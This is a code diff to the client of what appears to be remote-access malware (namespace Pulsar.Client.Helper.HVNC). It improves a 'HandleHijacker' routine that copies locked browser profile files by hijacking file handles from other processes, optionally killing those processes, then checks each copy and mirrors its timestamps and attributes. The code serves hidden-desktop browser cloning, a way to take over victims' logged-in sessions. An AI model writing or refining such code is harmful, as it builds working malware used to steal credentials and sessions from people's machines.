@@ -360,7 +360,8 @@ namespace Pulsar.Client.Helper.HVNC
         /// </summary>
         public static bool ForceCopyFile(string sourcePath, string destinationPath, bool killIfFailed = false)
         {
-            if (FileHandlerXeno.CloneFileByHandleHijacking(sourcePath, destinationPath))
+            bool hijacked = FileHandlerXeno.CloneFileByHandleHijacking(sourcePath, destinationPath);
+            if (hijacked && ValidateFileCopy(sourcePath, destinationPath))
             {
                 return true;
             }
@@ -374,12 +375,29 @@ namespace Pulsar.Client.Helper.HVNC
             try
             {
                 File.WriteAllBytes(destinationPath, fileData);
-                return true;
             }
-            catch
+            catch (Exception ex)
             {
+                Debug.WriteLine($"[HandleHijacker] Failed to write file '{destinationPath}': {ex.Message}");
                 return false;
             }
+
+            if (!ValidateFileCopy(sourcePath, destinationPath))
+            {
+                Debug.WriteLine($"[HandleHijacker] Validation failed after writing '{destinationPath}'.");
+                try
+                {
+                    if (File.Exists(destinationPath))
+                    {
+                        File.Delete(destinationPath);
+                    }
+                }
+                catch { }
+
+                return false;
+            }
+
+            return true;
         }
 
         private static bool DuplicateHandleFromProcess(int sourceProcessId, IntPtr sourceHandle, out IntPtr targetHandle)
@@ -566,6 +584,7 @@ namespace Pulsar.Client.Helper.HVNC
 
                 int totalFiles = files.Count;
                 int processed = 0;
+                bool allFilesCopied = true;
 
                 progress?.Report(new BrowserCloneProgress(0, totalFiles, string.Empty, totalFiles == 0));
 
@@ -583,13 +602,11 @@ namespace Pulsar.Client.Helper.HVNC
                         Directory.CreateDirectory(destFileDirectory);
                     }
 
-                    try
+                    bool copied = TryCopyFileWithValidation(file, destFile, killIfFailed);
+                    if (!copied)
                     {
-                        File.Copy(file, destFile, true);
-                    }
-                    catch
-                    {
-                        ForceCopyFile(file, destFile, killIfFailed);
+                        Debug.WriteLine($"[HandleHijacker] Failed to copy '{file}' to '{destFile}'.");
+                        allFilesCopied = false;
                     }
 
                     processed++;
@@ -598,13 +615,81 @@ namespace Pulsar.Client.Helper.HVNC
 
                 progress?.Report(new BrowserCloneProgress(totalFiles, totalFiles, string.Empty));
 
-                return true;
+                return allFilesCopied;
             }
             catch (Exception ex)
             {
                 Debug.WriteLine($"[HandleHijacker] Error copying directory: {ex.Message}");
                 return false;
             }
+        }
+
+        private static bool TryCopyFileWithValidation(string sourcePath, string destinationPath, bool killIfFailed)
+        {
+            try
+            {
+                File.Copy(sourcePath, destinationPath, true);
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"[HandleHijacker] Standard copy failed for '{sourcePath}': {ex.Message}");
+            }
+
+            if (ValidateFileCopy(sourcePath, destinationPath))
+            {
+                return true;
+            }
+
+            if (!ForceCopyFile(sourcePath, destinationPath, killIfFailed))
+            {
+                return false;
+            }
+
+            return ValidateFileCopy(sourcePath, destinationPath);
+        }
+
+        private static bool ValidateFileCopy(string sourcePath, string destinationPath)
+        {
+            try
+            {
+                if (!File.Exists(sourcePath) || !File.Exists(destinationPath))
+                {
+                    return false;
+                }
+
+                var sourceInfo = new FileInfo(sourcePath);
+                var destInfo = new FileInfo(destinationPath);
+
+                if (sourceInfo.Length != destInfo.Length)
+                {
+                    return false;
+                }
+
+                MirrorFileMetadata(sourceInfo, destInfo);
+                return true;
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"[HandleHijacker] Failed to validate copy '{sourcePath}' -> '{destinationPath}': {ex.Message}");
+                return false;
+            }
+        }
+
+        private static void MirrorFileMetadata(FileInfo sourceInfo, FileInfo destInfo)
+        {
+            try
+            {
+                File.SetAttributes(destInfo.FullName, sourceInfo.Attributes);
+            }
+            catch { }
+
+            try
+            {
+                File.SetCreationTimeUtc(destInfo.FullName, sourceInfo.CreationTimeUtc);
+                File.SetLastWriteTimeUtc(destInfo.FullName, sourceInfo.LastWriteTimeUtc);
+                File.SetLastAccessTimeUtc(destInfo.FullName, sourceInfo.LastAccessTimeUtc);
+            }
+            catch { }
         }
     }
 }
